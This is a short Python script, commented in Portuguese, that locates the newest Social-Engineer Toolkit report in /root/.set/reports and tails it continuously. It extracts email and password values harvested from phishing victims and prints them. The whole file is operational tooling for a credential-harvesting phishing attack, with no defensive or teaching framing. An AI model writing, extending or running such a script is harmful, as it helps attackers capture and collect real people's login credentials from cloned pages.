import os
import glob
import time


email = ''
password = ''

def encontrar_arquivo_mais_recente(diretorio):
    # Lista todos os arquivos no diretório (inclusive dentro de subpastas se necessário)
    # O SET costuma criar uma pasta XML ou HTML. Vamos focar em achar o arquivo XML ou texto modificado.
    # Para simplificar, vamos buscar qualquer arquivo na estrutura de reports.
    list_of_files = glob.glob(diretorio + "/*", recursive=True)

    if not list_of_files:
        return None

    # Retorna o arquivo com a data de criação mais recente
    latest_file = max(list_of_files, key=os.path.getctime)
    return latest_file


def monitorar_arquivo(caminho_arquivo):
    global email, password

    print(f"[*] Monitorando o arquivo: {caminho_arquivo}")

    try:
        with open(caminho_arquivo, 'r', errors='ignore') as f:
            f.seek(0, 2)  # Vai para o final

            while True:
                line = f.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                line = line.strip()  # Remove espaços e quebras de linha extras

                # --- Lógica de Captura ---
                if "Email=" in line:
                    # Tenta quebrar a linha no sinal de igual
                    partes = line.split("=")
                    if len(partes) > 1:
                        email = partes[1]  # Pega o que vem depois do =
                        print(f"[+] Email guardado na variavel global: {email}")

                if "passwd=" in line or "Passwd=" in line:
                    partes = line.split("=")
                    if len(partes) > 1:
                        password = partes[1]
                        print(f"[+] Senha guardada na variavel global: {password}")

    except KeyboardInterrupt:
        print("\nParando...")


def main():
    arquivo_recente = encontrar_arquivo_mais_recente('/root/.set/reports')

    # Se não achar na pasta padrão, tenta achar no diretório atual (caso tenha salvo log manual)
    if not arquivo_recente:
        print("[-] Nenhum relatório encontrado em /root/.set/reports.")
        # Tenta buscar um arquivo txt local se você usou o 'tee' do exemplo anterior
        exit()
    monitorar_arquivo(arquivo_recente)
    print(email)
    print(password)


if __name__ == "__main__":
    main()